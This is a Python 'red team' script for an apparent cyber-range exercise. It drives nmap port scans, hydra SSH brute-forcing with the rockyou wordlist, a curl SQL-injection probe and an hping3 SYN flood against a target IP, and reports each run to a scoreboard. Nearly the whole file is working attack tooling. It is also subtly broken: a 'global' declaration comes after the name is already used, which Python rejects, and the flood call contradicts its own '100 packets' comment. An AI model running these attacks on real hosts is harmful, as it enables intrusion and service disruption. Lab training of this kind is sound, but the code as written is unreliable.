#!/usr/bin/env python3
"""
CyberRange — Red Team Attack Scripts
Run these on the Kali Linux attacker machine.
Each script triggers an attack AND reports it to the scoreboard API.
"""

import subprocess
import requests
import argparse
import sys
import time

SCOREBOARD_URL = "http://192.168.1.20:5000"  # Blue Team machine running dashboard


def report(endpoint, payload=None):
    """Report attack result to the CyberRange scoreboard."""
    try:
        r = requests.post(f"{SCOREBOARD_URL}{endpoint}",
                          json=payload or {},
                          timeout=5)
        data = r.json()
        event = data.get("event", {})
        if event:
            delta = event.get("delta", 0)
            hp = event.get("health_after", "?")
            print(f"  [SCOREBOARD] {event['action']} | HP delta: {delta} | HP now: {hp}")
        return data
    except Exception as e:
        print(f"  [SCOREBOARD] Could not reach dashboard: {e}")
        return {}


# ─────────────────────────────────────────────
# ATTACK: PORT SCAN (nmap)
# ─────────────────────────────────────────────

def attack_portscan(target):
    print(f"\n[*] Starting nmap port scan against {target}")
    try:
        result = subprocess.run(
            ["nmap", "-T4", "--open", "-sV",
             "-p", "22,80,443,8080,3306,5432,27017", target],
            capture_output=True, text=True, timeout=60
        )
        print(result.stdout)
        open_ports = [
            line.split("/")[0].strip()
            for line in result.stdout.splitlines()
            if "/tcp" in line and "open" in line
        ]
        print(f"[+] Open ports found: {', '.join(open_ports) if open_ports else 'none'}")
    except FileNotFoundError:
        print("[-] nmap not found — install with: sudo apt install nmap")
        open_ports = []
    except subprocess.TimeoutExpired:
        print("[-] nmap scan timed out")
        open_ports = []

    report("/api/red/portscan", {"target": target})


# ─────────────────────────────────────────────
# ATTACK: SSH BRUTE FORCE (hydra)
# ─────────────────────────────────────────────

def attack_bruteforce(target, username="testuser",
                      wordlist="/usr/share/wordlists/rockyou.txt"):
    print(f"\n[*] Starting hydra SSH brute-force against {username}@{target}")
    print(f"    Wordlist: {wordlist}")
    try:
        result = subprocess.run(
            ["hydra", "-l", username, "-P", wordlist,
             f"ssh://{target}", "-t", "4", "-f", "-q"],
            capture_output=True, text=True, timeout=120
        )
        print(result.stdout)
        success = "login:" in result.stdout.lower()
        if success:
            print(f"[+] SUCCESS: Credentials cracked!")
        else:
            print(f"[-] FAILED: No credentials found in wordlist")
    except FileNotFoundError:
        print("[-] hydra not found — install with: sudo apt install hydra")
        success = False
    except subprocess.TimeoutExpired:
        print("[-] hydra timed out")
        success = False

    report("/api/red/bruteforce", {
        "target": target,
        "username": username,
        "success": success,
    })


# ─────────────────────────────────────────────
# ATTACK: WEB APP (curl/sqlmap)
# ─────────────────────────────────────────────

def attack_webapp(target):
    print(f"\n[*] Probing web app on http://{target}")
    try:
        result = subprocess.run(
            ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
             f"http://{target}/login?id=1'--"],
            capture_output=True, text=True, timeout=10
        )
        print(f"[*] HTTP response code: {result.stdout}")
    except Exception as e:
        print(f"[-] curl failed: {e}")

    report("/api/red/webapp", {"target": target})


# ─────────────────────────────────────────────
# ATTACK: DoS (hping3)
# ─────────────────────────────────────────────

def attack_dos(target):
    print(f"\n[*] Simulating DoS flood against {target}:80")
    print("[!] WARNING: Only run against machines you own.")
    print("[*] Sending 100 SYN packets (test only)…")
    try:
        subprocess.run(
            ["hping3", "-S", "--flood", "-p", "80", "-c", "100", target],
            timeout=15, capture_output=True
        )
        print("[+] DoS test completed")
    except FileNotFoundError:
        print("[-] hping3 not found — install with: sudo apt install hping3")
    except Exception as e:
        print(f"[-] DoS test error: {e}")

    report("/api/red/dos", {"target": target})


# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="CyberRange Red Team Attack Scripts",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 red_attacks.py --target 192.168.1.100 --attack portscan
  python3 red_attacks.py --target 192.168.1.100 --attack bruteforce --user testuser
  python3 red_attacks.py --target 192.168.1.100 --attack webapp
  python3 red_attacks.py --target 192.168.1.100 --attack dos
  python3 red_attacks.py --target 192.168.1.100 --attack all
        """
    )
    parser.add_argument("--target", "-t", required=True, help="Victim machine IP")
    parser.add_argument("--attack", "-a", required=True,
                        choices=["portscan", "bruteforce", "webapp", "dos", "all"],
                        help="Attack type to run")
    parser.add_argument("--user", "-u", default="testuser", help="Username for brute-force")
    parser.add_argument("--wordlist", "-w",
                        default="/usr/share/wordlists/rockyou.txt",
                        help="Wordlist path for brute-force")
    parser.add_argument("--scoreboard", "-s",
                        default=SCOREBOARD_URL,
                        help="Scoreboard URL (default: http://192.168.1.20:5000)")

    args = parser.parse_args()

    global SCOREBOARD_URL
    SCOREBOARD_URL = args.scoreboard

    print(f"""
╔══════════════════════════════════════════════════╗
║   CYBERRANGE — RED TEAM ATTACK CONSOLE           ║
║   Target:     {args.target:<34}║
║   Scoreboard: {SCOREBOARD_URL:<34}║
╚══════════════════════════════════════════════════╝
    """)

    if args.attack == "portscan" or args.attack == "all":
        attack_portscan(args.target)
    if args.attack == "bruteforce" or args.attack == "all":
        attack_bruteforce(args.target, args.user, args.wordlist)
        if args.attack == "all":
            time.sleep(2)
    if args.attack == "webapp" or args.attack == "all":
        attack_webapp(args.target)
    if args.attack == "dos" or args.attack == "all":
        attack_dos(args.target)


if __name__ == "__main__":
    main()
